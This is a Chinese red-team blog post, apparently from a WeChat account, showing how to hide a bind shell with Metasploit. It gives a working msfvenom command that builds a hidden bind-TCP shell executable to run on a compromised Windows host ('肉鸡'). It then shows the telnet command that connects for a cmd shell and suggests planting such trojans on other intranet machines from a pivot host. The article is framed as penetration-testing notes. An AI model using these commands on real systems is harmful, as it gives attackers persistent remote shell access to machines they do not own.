> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rRqYWnXA4dWQXHHvpxe_jA)

渗透攻击红队

一个专注于红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDoZibS8XU01CtEtSbwM3VGr3qskOmA1VkccY0mwKTCq6u2ia1xYRwBn3A/640?wx_fmt=jpeg)

  

  

大家好，这里是 **渗透攻击红队** 的第 **50** 篇文章，本公众号会记录一些红队攻击的笔记（由浅到深），不定时更新

![](https://mmbiz.qpic.cn/mmbiz_gif/7QRTvkK2qC4T65TNkYZsPg2BJ2VwibZicuBhV9DGqxlsxwG0n2ibhLuBsiamU7S0SqvAp6p33ucxPkuiaDiaKD6ibJGaQ/640?wx_fmt=gif)

正向 SHELL

在内网渗透中，正向 bind shell 会经常用到，可能有些兄弟还不清楚什么是正向 shell：**反向 reverse shell 就是通过我们监听，目标肉鸡运行 exe 我们就会收到一个反弹 shell；而正向就是目标肉鸡运行 exe，我们去连接肉鸡。**

最近很多人说我发广告啥的，我只想说一句：**所有的热爱都是在生活的前提上的，不管为了什么，前提是得保证能生存下去。**

**Metasploit 如何隐藏 Bind Shell**

**演示过程**

首先通过 MSF 生成一个正向 shell：

```
msfvenom -p windows/shell_hidden_bind_tcp LPORT=8889 AHOST=192.168.84.128 -f exe > bind_shell.exe
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJicNrxSjo4Ill4Yb3zR5qjqaF05wSo8GpKJ1PEibO071nA6XBfsmGY3tCNLbNhic4ymm4SWXeqUiapOQ/640?wx_fmt=png)

之后再肉鸡上运行 bind_shell.exe ：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJicNrxSjo4Ill4Yb3zR5qjqXpX4qUiaDIC7iaEv89PPKBVwS5Zibk643cFu4SGgwqd6ZuAQ4afb9cvIw/640?wx_fmt=png)

这个时候再 Hacker 机器上使用 Telnet 连接目标机器的时候，就会反弹一个 cmd shel 到黑客机器：  

```
telnet 192.168.84.154 8889
```

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJicNrxSjo4Ill4Yb3zR5qjqI6hKK6EgpQ7V0YEzZiacBficg9zEdicCePObBCjyTOibibTibK155fXRb0Sw/640?wx_fmt=png)

而此时使用其他机器与肉鸡建立 Telnet 是无法获取到 cmd shell 的：

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LJicNrxSjo4Ill4Yb3zR5qjq9pAFeaTqickicT4ibX1cQMQzeOXuxuOlVjZYSGmFwGukFmMMmiakfnibuSg/640?wx_fmt=png)

这样的好处在于你在做内网的时候拿下一台跳板机器，利用这台跳板机器当作黑客，生成一个正向木马丢到内网其他机器里，随时就可以通过 telnet 获取目标的 cmd  ，省去了一些麻烦。  

* * *

参考文章：

https://evi1cg.me/archives/Don-t_touch_my_shell.html

![](https://mmbiz.qpic.cn/mmbiz_png/ndicuTO22p6ibN1yF91ZicoggaJJZX3vQ77Vhx81O5GRyfuQoBRjpaUyLOErsSo8PwNYlT1XzZ6fbwQuXBRKf4j3Q/640?wx_fmt=png)  

渗透攻击红队

一个专注于渗透红队攻击的公众号

![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDdjBqfzUWVgkVA7dFfxUAATDhZQicc1ibtgzSVq7sln6r9kEtTTicvZmcw/640?wx_fmt=jpeg)

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDY9HXLCT5WoDFzKP1Dw8FZyt3ecOVF0zSDogBTzgN2wicJlRDygN7bfQ/640?wx_fmt=png)

点分享

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDRwPQ2H3KRtgzicHGD2bGf1Dtqr86B5mspl4gARTicQUaVr6N0rY1GgKQ/640?wx_fmt=png)

点点赞

![](https://mmbiz.qpic.cn/sz_mmbiz_png/dzeEUCA16LKwvIuOmsoicpffk7N0cVibfDgRo5uRP3s5pLrlJym85cYvUZRJDlqbTXHYVGXEZqD67ia9jNmwbNgxg/640?wx_fmt=png)

点在看